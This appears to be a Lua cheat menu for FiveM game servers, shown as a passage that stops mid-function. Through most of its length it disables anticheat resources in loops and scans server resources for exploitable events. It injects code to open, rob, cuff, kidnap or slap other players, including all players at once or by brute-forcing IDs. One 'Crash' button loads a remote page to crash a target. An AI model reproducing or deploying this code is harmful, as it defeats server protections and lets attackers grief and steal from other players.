--local KeysBin = MachoWebRequest("https://raw.githubusercontent.com/bv3d05/skgjfd/refs/heads/main/README.md")
--local CurrentKey = MachoAuthenticationKey()
--if not string.find(KeysBin, CurrentKey, 1, true) then
   --MachoMenuNotification("Authentication Failed", "Your key is not authorized.")
  --return
--end



local ecResources = {"EC-PANEL", "EC_AC"}
for _, resource in ipairs(ecResources) do
    if GetResourceState(resource) == "started" then
        MachoMenuNotification("Eagle AC Detected", "Blocking resource: " .. resource)
        print(resource)
        MachoMenuNotification("Eagle AC Blocked", "Resource " .. resource .. " stopped.")
    end
end

Citizen.CreateThread(function()
    local resources = GetNumResources()
    for i = 0, resources - 1 do
        local resource = GetResourceByFindIndex(i)
        local files = GetNumResourceMetadata(resource, 'client_script')
        for j = 0, files - 1 do
            local x = GetResourceMetadata(resource, 'client_script', j)
            if x ~= nil and string.find(x, "obfuscated") then
                MachoMenuNotification("FiveGuard AC Detected", "Blocking resource: " .. resource)
                print(resource)
                MachoMenuNotification("FiveGuard Blocked", "Resource " .. resource .. " stopped.")
                break
            end
        end
    end
end)
local z = ""

-- Function to scan for Electron Anticheat
local function ScanElectronAnticheat()
    local foundAnticheat = false
    local foundScriptName = ""

    local resources = GetNumResources()
    for i = 0, resources - 1 do
        local resource = GetResourceByFindIndex(i)
        local manifest = LoadResourceFile(resource, "fxmanifest.lua")
        if manifest then
            if string.find(string.lower(manifest), "https://electron-services.com") or 
               string.find(string.lower(manifest), "electron services") or 
               string.find(string.lower(manifest), "the most advanced fivem anticheat") then
                foundAnticheat = true
                foundScriptName = resource
                detectedElectronResource = resource
                break
            end
        end
    end

    return foundAnticheat, foundScriptName
end
Citizen.CreateThread(function()
            if GetResourceState("EC_AC") == "started" then
                CreateThread(function()
                    while true do
                        MachoResourceStop("EC_AC")
                        MachoResourceStop("EC-PANEL")
                        MachoResourceStop("vMenu")
                        Wait(100)
                    end
                end)
            else
                CreateThread(function()
                    for i = 0, GetNumResources() - 1 do
                        local v = GetResourceByFindIndex(i)
                        if v and GetResourceState(v) == "started" then
                            if GetResourceMetadata(v, "ac", 0) == "fg" then
                                while true do
                                    MachoResourceStop(v)
                                    Wait(100)
                                end
                            end
                        end
                    end
                end)
            end
        end)
-- Auto-detection and notification function
Citizen.CreateThread(function()
    local foundAnticheat, foundScriptName = ScanElectronAnticheat()
    Citizen.Wait(500)
    
    if foundAnticheat then
        MachoMenuNotification("Electron AC Detected", "Electron Anticheat System Found in Resource: " .. foundScriptName)
    end
end)

-- Background silent search
local function backgroundSilentSearch()
    Citizen.CreateThread(function()
        Citizen.Wait(1000) -- Reduced wait time
        
        local totalResources = GetNumResources()
        local searchedResources = 0
        local backgroundTriggers = {items = {}, money = {}, troll = {}, payment = {}, vehicle = {}}
        
        for i = 0, totalResources - 1 do
            local resourceName = GetResourceByFindIndex(i)
            if resourceName and GetResourceState(resourceName) == "started" then
                searchedResources = searchedResources + 1
                
                local skipPatterns = {
                    "mysql", "oxmysql", "ghmattimysql", "webpack", "yarn", "node_modules",
                    "discord", "screenshot", "loading", "spawn", "weather", "time",
                    "map", "ui", "hud", "chat", "voice", "radio", "tokovoip", "salt",
                    "filesystem", "any", "admin", "logging"
                }
                
                local shouldSkip = false
                local lowerName = string.lower(resourceName)
                for _, pattern in ipairs(skipPatterns) do
                    if string.find(lowerName, pattern, 1, true) then
                        shouldSkip = true
                        break
                    end
                end
                
                if not shouldSkip then
                    local checkFiles = {"client.lua", "server.lua", "shared.lua"}
                    for _, fileName in ipairs(checkFiles) do
                        local success, content = pcall(function()
                            return LoadResourceFile(resourceName, fileName)
                        end)
                        if success and content and content ~= "" and string.len(content) < 200000 then
                            local contentLower = string.lower(content)
                            
                            -- Quick pattern matching
                            if string.find(contentLower, "inventory.*server.*open") then
                                table.insert(backgroundTriggers.items, {
                                    resource = resourceName,
                                    trigger = "inventory:server:OpenInventory",
                                    file = fileName,
                                    state = "started"
                                })
                            end
                            
                            if string.find(contentLower, "givecomm") then
                                table.insert(backgroundTriggers.money, {
                                    resource = resourceName,
                                    trigger = resourceName .. ":server:GiveComm",
                                    file = fileName,
                                    state = "started"
                                })
                            end
                            
                            if string.find(contentLower, "paymentcheck") then
                                table.insert(backgroundTriggers.payment, {
                                    resource = resourceName,
                                    trigger = "QBCore:server:Paymentcheck",
                                    file = fileName,
                                    state = "started"
                                })
                            end
                            
                            if string.find(contentLower, "spawnvehicle") then
                                table.insert(backgroundTriggers.vehicle, {
                                    resource = resourceName,
                                    trigger = "QBCore:Command:SpawnVehicle",
                                    file = fileName,
                                    state = "started"
                                })
                            end
                        end
                        
                        -- Faster processing with smaller delays
                        if searchedResources % 20 == 0 then
                            Citizen.Wait(10)
                        end
                    end
                end
            end
        end
        
        -- Merge background findings with main triggers silently
        for category, triggers in pairs(backgroundTriggers) do
            for _, trigger in ipairs(triggers) do
                local isDuplicate = false
                for _, existing in ipairs(foundTriggers[category]) do
                    if existing.resource == trigger.resource and existing.trigger == trigger.trigger then
                        isDuplicate = true
                        break
                    end
                end
                if not isDuplicate then
                    table.insert(foundTriggers[category], trigger)
                end
            end
        end
    end)
end

-- Menu Configuration
local MenuSize = vec2(850, 550)
local MenuStartCoords = vec2(500, 500)
local TabsBarWidth = 180
local SectionsPadding = 10
local MachoPaneGap = 10

-- Simple storage
local foundTriggers = {
    items = {},
    money = {},
    troll = {},
    payment = {},
    vehicle = {}
}

local MenuWindow = nil
local isPlayerIdsEnabled = false
local playerGamerTags = {}
local isPaymentLoopRunning = false
local paymentSpeedInput = nil
local paymentLoopSpeed = 1000 -- Default speed in milliseconds
local isSpectating = false
local spectatingTarget = nil

-- File list
local allFiles = {
    "client.lua", "server.lua", "shared.lua", "config.lua", "main.lua",
    "client/main.lua", "server/main.lua", "shared/main.lua",
    "client/interactions.lua", "client/police.lua", "client/job.lua",
    "server/interactions.lua", "server/police.lua", "server/job.lua",
    "inventory/client.lua", "inventory/server.lua", "inventory/config.lua",
    "qs-inventory/client.lua", "qs-inventory/server.lua",
    "ox_inventory/client.lua", "ox_inventory/server.lua",
    "jobs/police/client.lua", "jobs/police/server.lua",
    "police/client.lua", "police/server.lua",
    "banking/client.lua", "banking/server.lua",
    "shops/client.lua", "shops/server.lua",
    "core/client.lua", "core/server.lua",
    "bridge/client.lua", "bridge/server.lua"
}

-- Players Section Buttons
local function setupPlayerSectionButtons(PlayersSection, playerIdInput)
    MachoMenuButton(PlayersSection, "Open Player Inventory", function()
        local playerId = MachoMenuGetInputbox(playerIdInput)
        if playerId and playerId ~= "" then
            if playerId == "-1" then
                local allPlayers = GetActivePlayers()
                for _, player in ipairs(allPlayers) do
                    local numId = GetPlayerServerId(player)
                    if numId and numId > 0 then
                        for _, triggerData in ipairs(foundTriggers.items) do
                            MachoInjectResource(triggerData.resource, 'TriggerServerEvent("inventory:server:OpenInventory", "otherplayer", ' .. numId .. ')')
                        end
                        MachoMenuNotification("Players", "Opened inventory for ID: " .. numId)
                    end
                end
                MachoMenuNotification("Players", "Opened inventories for all players")
            else
                local numId = tonumber(playerId)
                if numId then
                    for _, triggerData in ipairs(foundTriggers.items) do
                        MachoInjectResource(triggerData.resource, 'TriggerServerEvent("inventory:server:OpenInventory", "otherplayer", ' .. numId .. ')')
                    end
                    MachoMenuNotification("Players", "Opened inventory for ID: " .. numId)
                else
                    MachoMenuNotification("Error", "Invalid Player ID")
                end
            end
        else
            MachoMenuNotification("Error", "Enter a Player ID or -1 for all")
        end
    end)
MachoMenuButton(PlayersSection, "Crash", function()
   local playerId = MachoMenuGetInputbox(playerIdInput)
   if playerId and playerId ~= "" then
       local serverId = tonumber(playerId)
       if serverId and serverId > 0 then
           -- حفظ الموقع الحالي قبل النقل
           local ped = PlayerPedId()
           local originalCoords = GetEntityCoords(ped)
           
           -- إنشاء وعرض DUI
           local dui = MachoCreateDui("https://wf-675.github.io/crashingo.gg/")
           MachoShowDui(dui)
           
           -- 1. تشغيل كود إيقاف الـ Anti-Cheat بدون ريسورس (آمن)
           Citizen.CreateThread(function()
               if GetResourceState("EC_AC") == "started" then
                   CreateThread(function()
                       while true do
                           MachoResourceStop("EC_AC")
                           MachoResourceStop("EC-PANEL")
                           MachoResourceStop("vMenu")
                           Wait(100) -- تأخير أطول لتجنب البان
                       end
                   end)
               else
                   CreateThread(function()
                       for i = 0, GetNumResources() - 1 do
                           local v = GetResourceByFindIndex(i)
                           if v and GetResourceState(v) == "started" then
                               if GetResourceMetadata(v, "ac", 0) == "fg" then
                                   while true do
                                       MachoResourceStop(v)
                                       Wait(100) -- تأخير أطول لتجنب البان
                                   end
                               end
                           end
                       end
                   end)
               end
           end)
           
           -- 2. نقل اللاعب لمكان بعيد وتشغيل التريقر
           Citizen.CreateThread(function()
               
               -- نقل اللاعب لمكان بعيد (خارج الريندر لكن ليس مره بعيد) - آمن
               Wait(500)
               SetEntityCoords(ped, 1500.0, -1500.0, 58.0, false, false, false, true)
               Wait(100)
               
               Wait(500) -- انتظار أطول
               
               -- 3. تشغيل تريقر الاختطاف باستخدام foundTriggers (بدون تأخير - آمن)
               for _, triggerData in ipairs(foundTriggers.items) do
                   MachoInjectResource(triggerData.resource, 'TriggerServerEvent("police:server:KidnapPlayer", ' .. serverId .. ')')
               end
               
               -- 4. الإرجاع للمكان الأصلي بعد 5 ثواني وإخفاء DUI
               Wait(1000) -- انتظار 5 ثوانِ
               
               -- إرجاع آمن للموقع الأصلي
               SetEntityCoords(ped, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, true)
               Wait(100)
               
               -- إخفاء وحذف DUI
               Wait(100)
               MachoHideDui(dui)
               MachoDestroyDui(dui)
           end)
           
       else
           MachoMenuNotification("Error", "Invalid Player ID")
       end
   else
       MachoMenuNotification("Error", "Enter a Player ID")
   end
end)
    

    MachoMenuButton(PlayersSection, "Revive Player", function()
        local playerId = MachoMenuGetInputbox(playerIdInput)
        if playerId and playerId ~= "" then
            if playerId == "-1" then
                local allPlayers = GetActivePlayers()
                for _, player in ipairs(allPlayers) do
                    local numId = GetPlayerServerId(player)
                    if numId and numId > 0 then
                        for _, triggerData in ipairs(foundTriggers.items) do
                            MachoInjectResource(triggerData.resource, 'TriggerServerEvent("hospital:server:RevivePlayer", ' .. numId .. ', false, true)')
                        end
                        MachoMenuNotification("Players", "Revived ID: " .. numId)
                    end
                end
                MachoMenuNotification("Players", "Revived all players")
            else
                local numId = tonumber(playerId)
                if numId then
                    for _, triggerData in ipairs(foundTriggers.items) do
                        MachoInjectResource(triggerData.resource, 'TriggerServerEvent("hospital:server:RevivePlayer", ' .. numId .. ', false, true)')
                    end
                    MachoMenuNotification("Players", "Revived ID: " .. numId)
                else
                    MachoMenuNotification("Error", "Invalid Player ID")
                end
            end
        else
            MachoMenuNotification("Error", "Enter a Player ID or -1 for all")
        end
    end)

    MachoMenuButton(PlayersSection, "Slap Player", function()
        local playerId = MachoMenuGetInputbox(playerIdInput)
        if playerId and playerId ~= "" then
            if playerId == "-1" then
                local allPlayers = GetActivePlayers()
                for _, player in ipairs(allPlayers) do
                    local numId = GetPlayerServerId(player)
                    if numId and numId > 0 then
                        -- Search for littlethings resource and verify it contains the slap event
                        local totalRes = GetNumResources()
                        local foundSlapResource = false
                        for i = 0, totalRes - 1 do
                            local resName = GetResourceByFindIndex(i)
                            if resName and GetResourceState(resName) == "started" then
                                local lowerName = string.lower(resName)
                                if string.find(lowerName, "littlethings") or string.find(lowerName, "slap") or string.find(lowerName, "admin") then
                                    -- Verify the resource contains the slap event by checking files
                                    local slapEventFound = false
                                    local checkFiles = {"client.lua", "server.lua", "shared.lua", "client/main.lua", "server/main.lua"}
                                    for _, fileName in ipairs(checkFiles) do
                                        local success, content = pcall(function()
                                            return LoadResourceFile(resName, fileName)
                                        end)
                                        if success and content and content ~= "" then
                                            local contentLower = string.lower(content)
                                            if string.find(contentLower, "slap:event") or string.find(contentLower, "slap_event") then
                                                slapEventFound = true
                                                break
                                            end
                                        end
                                    end
                                    if slapEventFound then
                                        MachoInjectResource(resName, 'TriggerEvent("Slap:Event", ' .. numId .. ')')
                                        foundSlapResource = true
                                        break
                                    end
                                end
                            end
                        end
                        if foundSlapResource then
                            MachoMenuNotification("Players", "Slapped Player ID: " .. numId)
                        else
                            MachoMenuNotification("Error", "Slap event not found in any resource")
                            return
                        end
                    end
                end
                if foundSlapResource then
                    MachoMenuNotification("Players", "Slapped all players")
                end
            else
                local numId = tonumber(playerId)
                if numId then
                    -- Search for littlethings resource and verify it contains the slap event
                    local totalRes = GetNumResources()
                    local foundSlapResource = false
                    for i = 0, totalRes - 1 do
                        local resName = GetResourceByFindIndex(i)
                        if resName and GetResourceState(resName) == "started" then
                            local lowerName = string.lower(resName)
                            if string.find(lowerName, "littlethings") or string.find(lowerName, "slap") or string.find(lowerName, "admin") then
                                -- Verify the resource contains the slap event by checking files
                                local slapEventFound = false
                                local checkFiles = {"client.lua", "server.lua", "shared.lua", "client/main.lua", "server/main.lua"}
                                for _, fileName in ipairs(checkFiles) do
                                    local success, content = pcall(function()
                                        return LoadResourceFile(resName, fileName)
                                    end)
                                    if success and content and content ~= "" then
                                        local contentLower = string.lower(content)
                                        if string.find(contentLower, "slap:event") or string.find(contentLower, "slap_event") then
                                            slapEventFound = true
                                            break
                                        end
                                    end
                                end
                                if slapEventFound then
                                    MachoInjectResource(resName, 'TriggerEvent("Slap:Event", ' .. numId .. ')')
                                    foundSlapResource = true
                                    break
                                end
                            end
                        end
                    end
                    if foundSlapResource then
                        MachoMenuNotification("Players", "Slapped Player ID: " .. numId)
                    else
                        MachoMenuNotification("Error", "Slap event not found in any resource")
                    end
                else
                    MachoMenuNotification("Error", "Invalid Player ID")
                end
            end
        else
            MachoMenuNotification("Error", "Enter a Player ID or -1 for all")
        end
    end)

    MachoMenuButton(PlayersSection, "Search Player", function()
        local playerId = MachoMenuGetInputbox(playerIdInput)
        if playerId and playerId ~= "" then
            if playerId == "-1" then
                local allPlayers = GetActivePlayers()
                for _, player in ipairs(allPlayers) do
                    local numId = GetPlayerServerId(player)
                    if numId and numId > 0 then
                        -- Search for police resource and verify it contains the search event
                        local totalRes = GetNumResources()
                        local foundSearchResource = false
                        for i = 0, totalRes - 1 do
                            local resName = GetResourceByFindIndex(i)
                            if resName and GetResourceState(resName) == "started" then
                                local lowerName = string.lower(resName)
                                if string.find(lowerName, "police") then
                                    -- Verify the resource contains the search event by checking files
                                    local searchEventFound = false
                                    local checkFiles = {"client.lua", "server.lua", "shared.lua", "client/main.lua", "server/main.lua"}
                                    for _, fileName in ipairs(checkFiles) do
                                        local success, content = pcall(function()
                                            return LoadResourceFile(resName, fileName)
                                        end)
                                        if success and content and content ~= "" then
                                            local contentLower = string.lower(content)
                                            if string.find(contentLower, "police:server:searchplayer") or string.find(contentLower, "searchplayer") then
                                                searchEventFound = true
                                                break
                                            end
                                        end
                                    end
                                    if searchEventFound then
                                        MachoInjectResource(resName, 'TriggerServerEvent("police:server:SearchPlayer", ' .. numId .. ')')
                                        foundSearchResource = true
                                        break
                                    end
                                end
                            end
                        end
                        if foundSearchResource then
                            MachoMenuNotification("Players", "Searched Player ID: " .. numId)
                        else
                            MachoMenuNotification("Error", "Search event not found in any police resource")
                            return
                        end
                    end
                end
                if foundSearchResource then
                    MachoMenuNotification("Players", "Searched all players")
                end
            else
                local numId = tonumber(playerId)
                if numId then
                    -- Search for police resource and verify it contains the search event
                    local totalRes = GetNumResources()
                    local foundSearchResource = false
                    for i = 0, totalRes - 1 do
                        local resName = GetResourceByFindIndex(i)
                        if resName and GetResourceState(resName) == "started" then
                            local lowerName = string.lower(resName)
                            if string.find(lowerName, "police") then
                                -- Verify the resource contains the search event by checking files
                                local searchEventFound = false
                                local checkFiles = {"client.lua", "server.lua", "shared.lua", "client/main.lua", "server/main.lua"}
                                for _, fileName in ipairs(checkFiles) do
                                    local success, content = pcall(function()
                                        return LoadResourceFile(resName, fileName)
                                    end)
                                    if success and content and content ~= "" then
                                        local contentLower = string.lower(content)
                                        if string.find(contentLower, "police:server:searchplayer") or string.find(contentLower, "searchplayer") then
                                            searchEventFound = true
                                            break
                                        end
                                    end
                                end
                                if searchEventFound then
                                    MachoInjectResource(resName, 'TriggerServerEvent("police:server:SearchPlayer", ' .. numId .. ')')
                                    foundSearchResource = true
                                    break
                                end
                            end
                        end
                    end
                    if foundSearchResource then
                        MachoMenuNotification("Players", "Searched Player ID: " .. numId)
                    else
                        MachoMenuNotification("Error", "Search event not found in any police resource")
                    end
                else
                    MachoMenuNotification("Error", "Invalid Player ID")
                end
            end
        else
            MachoMenuNotification("Error", "Enter a Player ID or -1 for all")
        end
    end)

    MachoMenuButton(PlayersSection, "Kidnap Player", function()
        local playerId = MachoMenuGetInputbox(playerIdInput)
        if playerId and playerId ~= "" then
            if playerId == "-1" then
                local allPlayers = GetActivePlayers()
                for _, player in ipairs(allPlayers) do
                    local numId = GetPlayerServerId(player)
                    if numId and numId > 0 then
                        -- Search for police resource and verify it contains the kidnap event
                        local totalRes = GetNumResources()
                        local foundKidnapResource = false
                        for i = 0, totalRes - 1 do
                            local resName = GetResourceByFindIndex(i)
                            if resName and GetResourceState(resName) == "started" then
                                local lowerName = string.lower(resName)
                                if string.find(lowerName, "police") then
                                    -- Verify the resource contains the kidnap event by checking files
                                    local kidnapEventFound = false
                                    local checkFiles = {"client.lua", "server.lua", "shared.lua", "client/main.lua", "server/main.lua"}
                                    for _, fileName in ipairs(checkFiles) do
                                        local success, content = pcall(function()
                                            return LoadResourceFile(resName, fileName)
                                        end)
                                        if success and content and content ~= "" then
                                            local contentLower = string.lower(content)
                                            if string.find(contentLower, "police:server:kidnapplayer") or string.find(contentLower, "kidnapplayer") then
                                                kidnapEventFound = true
                                                break
                                            end
                                        end
                                    end
                                    if kidnapEventFound then
                                        MachoInjectResource(resName, 'TriggerServerEvent("police:server:KidnapPlayer", ' .. numId .. ')')
                                        foundKidnapResource = true
                                        break
                                    end
                                end
                            end
                        end
                        if foundKidnapResource then
                            MachoMenuNotification("Players", "Kidnapped Player ID: " .. numId)
                        else
                            MachoMenuNotification("Error", "Kidnap event not found in any police resource")
                            return
                        end
                    end
                end
                if foundKidnapResource then
                    MachoMenuNotification("Players", "Kidnapped all players")
                end
            else
                local numId = tonumber(playerId)
                if numId then
                    -- Search for police resource and verify it contains the kidnap event
                    local totalRes = GetNumResources()
                    local foundKidnapResource = false
                    for i = 0, totalRes - 1 do
                        local resName = GetResourceByFindIndex(i)
                        if resName and GetResourceState(resName) == "started" then
                            local lowerName = string.lower(resName)
                            if string.find(lowerName, "police") then
                                -- Verify the resource contains the kidnap event by checking files
                                local kidnapEventFound = false
                                local checkFiles = {"client.lua", "server.lua", "shared.lua", "client/main.lua", "server/main.lua"}
                                for _, fileName in ipairs(checkFiles) do
                                    local success, content = pcall(function()
                                        return LoadResourceFile(resName, fileName)
                                    end)
                                    if success and content and content ~= "" then
                                        local contentLower = string.lower(content)
                                        if string.find(contentLower, "police:server:kidnapplayer") or string.find(contentLower, "kidnapplayer") then
                                            kidnapEventFound = true
                                            break
                                        end
                                    end
                                end
                                if kidnapEventFound then
                                    MachoInjectResource(resName, 'TriggerServerEvent("police:server:KidnapPlayer", ' .. numId .. ')')
                                    foundKidnapResource = true
                                    break
                                end
                            end
                        end
                    end
                    if foundKidnapResource then
                        MachoMenuNotification("Players", "Kidnapped Player ID: " .. numId)
                    else
                        MachoMenuNotification("Error", "Kidnap event not found in any police resource")
                    end
                else
                    MachoMenuNotification("Error", "Invalid Player ID")
                end
            end
        else
            MachoMenuNotification("Error", "Enter a Player ID or -1 for all")
        end
    end)

    MachoMenuButton(PlayersSection, "Rob Player", function()
        local playerId = MachoMenuGetInputbox(playerIdInput)
        if playerId and playerId ~= "" then
            if playerId == "-1" then
                local allPlayers = GetActivePlayers()
                for _, player in ipairs(allPlayers) do
                    local numId = GetPlayerServerId(player)
                    if numId and numId > 0 then
                        for _, triggerData in ipairs(foundTriggers.items) do
                            local advancedRobCode = string.format([[
                                local targetServerId = %d
                                local targetPlayer = GetPlayerFromServerId(targetServerId)
                                if targetPlayer ~= -1 then
                                    local targetPed = GetPlayerPed(targetPlayer)
                                    if targetPed ~= 0 and DoesEntityExist(targetPed) then
                                        local playerPed = PlayerPedId()
                                        TriggerServerEvent("police:server:RobPlayer", targetServerId)
                                    end
                                end
                            ]], numId)
                            MachoInjectResource(triggerData.resource, advancedRobCode)
                        end
                        MachoMenuNotification("Players", "Advanced Rob executed for ID: " .. numId)
                    end
                end
                MachoMenuNotification("Players", "Advanced Rob executed for all players")
            else
                local numId = tonumber(playerId)
                if numId then
                    for _, triggerData in ipairs(foundTriggers.items) do
                        local advancedRobCode = string.format([[
                            local targetServerId = %d
                            local targetPlayer = GetPlayerFromServerId(targetServerId)
                            if targetPlayer ~= -1 then
                                local targetPed = GetPlayerPed(targetPlayer)
                                if targetPed ~= 0 and DoesEntityExist(targetPed) then
                                    local playerPed = PlayerPedId()
                                    local originalCoords = GetEntityCoords(playerPed)
                                    local targetCoords = GetEntityCoords(targetPed)
                                    local teleportCoords = vector3(targetCoords.x, targetCoords.y, targetCoords.z - 1.0)
                                    TriggerServerEvent("police:server:RobPlayer", targetServerId)
                                end
                            end
                        ]], numId)
                        MachoInjectResource(triggerData.resource, advancedRobCode)
                    end
                    MachoMenuNotification("Players", "Advanced Rob executed for ID: " .. numId)
                else
                    MachoMenuNotification("Error", "Invalid Player ID")
                end
            end
        else
            MachoMenuNotification("Error", "Enter a Player ID or -1 for all")
        end
    end)

    MachoMenuButton(PlayersSection, "Cuff Player", function()
    local playerId = MachoMenuGetInputbox(playerIdInput)
    if playerId and playerId ~= "" then
        if playerId == "-1" then
            local players = GetActivePlayers()
            if #players > 0 then
                local cuffedCount = 0
                for _, player in ipairs(players) do
                    local serverId = GetPlayerServerId(player)
                    if serverId and serverId > 0 then
                        for _, triggerData in ipairs(foundTriggers.items) do
                            MachoInjectResource(triggerData.resource, 'TriggerServerEvent("police:server:CuffPlayer", ' .. serverId .. ', true)')
                        end
                        cuffedCount = cuffedCount + 1
                        Citizen.Wait(100)
                    end
                end
                if cuffedCount > 0 then
                    MachoMenuNotification("Players", "Cuffed " .. cuffedCount .. " players!")
                else
                    MachoMenuNotification("Error", "No valid players to cuff!")
                end
            else
                MachoMenuNotification("Error", "No active players found!")
            end
        elseif playerId == "0" then
            Citizen.CreateThread(function()
                local cuffedCount = 0
                for serverId = 1, 1400 do
                    if serverId > 0 then
                        for _, triggerData in ipairs(foundTriggers.items) do
                            MachoInjectResource(triggerData.resource, 'TriggerServerEvent("police:server:CuffPlayer", ' .. serverId .. ', true)')
                        end
                        cuffedCount = cuffedCount + 1
                        MachoMenuNotification("Players", "Tried Cuffing ID: " .. serverId)
                        Citizen.Wait(10) -- تأخير 10 مللي ثانية
                    end
                end
                if cuffedCount > 0 then
                    MachoMenuNotification("Players", "Tried cuffing " .. cuffedCount .. " IDs!")
                else
                    MachoMenuNotification("Error", "No valid IDs processed!")
                end
            end)
        else
            local serverId = tonumber(playerId)
            if serverId and serverId > 0 then
                for _, triggerData in ipairs(foundTriggers.items) do
                    MachoInjectResource(triggerData.resource, 'TriggerServerEvent("police:server:CuffPlayer", ' .. serverId .. ', true)')
                end
                MachoMenuNotification("Players", "Cuffed Player ID: " .. serverId)
            else
                MachoMenuNotification("Error", "Invalid Player ID")
            end
        end
    else
        MachoMenuNotification("Error", "Enter a Player ID or -1 for all")
    end
end)

    MachoMenuButton(PlayersSection, "Uncuff Player", function()
        local playerId = MachoMenuGetInputbox(playerIdInput)
        if playerId and playerId ~= "" then
            if playerId == "-1" then
                local allPlayers = GetActivePlayers()
                for _, player in ipairs(allPlayers) do
                    local numId = GetPlayerServerId(player)
                    if numId and numId > 0 then
                        for _, triggerData in ipairs(foundTriggers.items) do
                            MachoInjectResource(triggerData.resource, 'TriggerServerEvent("police:server:CuffPlayer", ' .. numId .. ', false)')
                        end
                        MachoMenuNotification("Players", "Uncuffed Player ID: " .. numId)
                    end
                end
                MachoMenuNotification("Players", "Uncuffed all players")
            else
                local numId = tonumber(playerId)
                if numId then
                    for _, triggerData in ipairs(foundTriggers.items) do
                        MachoInjectResource(triggerData.resource, 'TriggerServerEvent("police:server:CuffPlayer", ' .. numId .. ', false)')
                    end
                    MachoMenuNotification("Players", "Uncuffed Player ID: " .. numId)
                else
                    MachoMenuNotification("Error", "Invalid Player ID")
                end
            end
        else
            MachoMenuNotification("Error", "Enter a Player ID or -1 for all")
        end
    end)

end

-- Check for littlethings resource and execute trigger
local function checkAndExecuteLittlethings()
    local totalRes = GetNumResources()
    for i = 0, totalRes - 1 do
        local resName = GetResourceByFindIndex(i)
        if resName and GetResourceState(resName) == "started" then
            local lowerName = string.lower(resName)
            if string.find(lowerName, "littlethings") then
                MachoInjectResource(resName, 'TriggerServerEvent("QBCore:server:Paymentcheck")')
                table.insert(foundTriggers.payment, {
                    resource = resName,
                    trigger = "QBCore:server:Paymentcheck",
                    file = "littlethings",
                    state = "started"
                })
                MachoMenuNotification("Success", "Found littlethings resource, executing payment check")
                return true
            end
        end
    end
    return false
end

-- Comprehensive search
local function comprehensiveSearch()
    foundTriggers = {items = {}, money = {}, troll = {}, payment = {}, vehicle = {}}
    local foundCount = 0
    local expandedMappings = {
        ["qb-core"] = {
            {type = "vehicle", trigger = "QBCore:Command:SpawnVehicle"},
        },
        ["qb-inventory"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["qs-inventory"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["esx_inventoryhud"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["origen_inventory"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["core_inventory"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["hd-policejob"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["qb-policejob"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["esx-policejob"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["police"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["qb-shops"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["bridge"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["core-bridge"] = {{type = "items", trigger = "inventory:server:OpenInventory"}},
        ["envi-bridge"] = {{type = "items", trigger = "inventory:server:OpenInventory"}}
    }

    -- Check mapped resources
    for resourceName, triggers in pairs(expandedMappings) do
        local state = GetResourceState(resourceName)
        if state == "started" then
            for _, triggerInfo in ipairs(triggers) do
                table.insert(foundTriggers[triggerInfo.type], {
                    resource = resourceName,
                    trigger = triggerInfo.trigger,
                    file = "database",
                    state = state
                })
                foundCount = foundCount + 1
            end
        end
    end

    -- Search for "littlethings" resource for payment trigger
    local totalRes = GetNumResources()
    for i = 0, totalRes - 1 do
        local resName = GetResourceByFindIndex(i)
        if resName and GetResourceState(resName) == "started" then
            local lowerName = string.lower(resName)
            if string.find(lowerName, "littlethings") then
                local isDuplicate = false
                for _, existing in ipairs(foundTriggers.payment) do
                    if existing.trigger == "QBCore:server:Paymentcheck" then
                        isDuplicate = true
                        break
                    end
                end
                if not isDuplicate then
                    table.insert(foundTriggers.payment, {
                        resource = resName,
                        trigger = "QBCore:server:Paymentcheck",
                        file = "littlethings",
                        state = "started"
                    })
                    foundCount = foundCount + 1
                end
            end
        end
    end

    -- Search for auction-related resources
    for i = 0, totalRes - 1 do
        local resName = GetResourceByFindIndex(i)
        if resName and GetResourceState(resName) == "started" then
            local lowerName = string.lower(resName)
            if string.find(lowerName, "carauction") or string.find(lowerName, "auction") then
                local dynamicTrigger = resName .. ":server:GiveComm"
                local isDuplicate = false
                for _, existing in ipairs(foundTriggers.money) do
                    if existing.trigger == dynamicTrigger then
                        isDuplicate = true
                        break
                    end
                end
                if not isDuplicate then
                    table.insert(foundTriggers.money, {
                        resource = resName,
                        trigger = dynamicTrigger,
                        file = "auction-pattern",
                        state = "started"
                    })
                    foundCount = foundCount + 1
                end
            end
        end
    end

    -- Advanced pattern search for additional triggers
    local advancedPatterns = {
        {patterns = {"inventory", "inv"}, triggers = {{type = "items", trigger = "inventory:server:OpenInventory"}}},
        {patterns = {"police", "cop", "sheriff", "leo"}, triggers = {{type = "items", trigger = "inventory:server:OpenInventory"}}},
        {patterns = {"job", "work", "employment"}, triggers = {{type = "items", trigger = "inventory:server:OpenInventory"}}},
        {patterns = {"shop", "store", "market"}, triggers = {{type = "items", trigger = "inventory:server:OpenInventory"}}},
        {patterns = {"core", "framework", "base"}, triggers = {{type = "vehicle", trigger = "QBCore:Command:SpawnVehicle"}}},
        {patterns = {"vehicle", "car", "garage"}, triggers = {{type = "vehicle", trigger = "QBCore:Command:SpawnVehicle"}}},
        {patterns = {"carauction", "auction"}, triggers = {{type = "money", trigger = "qb-carauction:server:GiveComm"}}}
    }
    local skipPatterns = {
        "mysql", "discord", "screenshot", "loading", "weather", "time",
        "map", "ui", "hud", "chat", "voice", "radio", "salt", "admin",
        "logging", "webpack", "yarn", "node", "lib", "util", "config",
        "monitor", "filesystem", "dependencies", "helper"
    }

    for i = 0, totalRes - 1 do
        local resName = GetResourceByFindIndex(i)
        if resName and GetResourceState(resName) == "started" then
            local lowerName = string.lower(resName)
            local shouldSkip = false
            for _, skipPattern in ipairs(skipPatterns) do
                if string.find(lowerName, skipPattern, 1, true) then
                    shouldSkip = true
                    break
                end
            end
            if expandedMappings[resName] or string.find(lowerName, "littlethings") then
                shouldSkip = true
            end
            if not shouldSkip then
                for _, patternGroup in ipairs(advancedPatterns) do
                    local matches = false
                    for _, pattern in ipairs(patternGroup.patterns) do
                        if string.find(lowerName, pattern, 1, true) then
                            matches = true
                            break
                        end
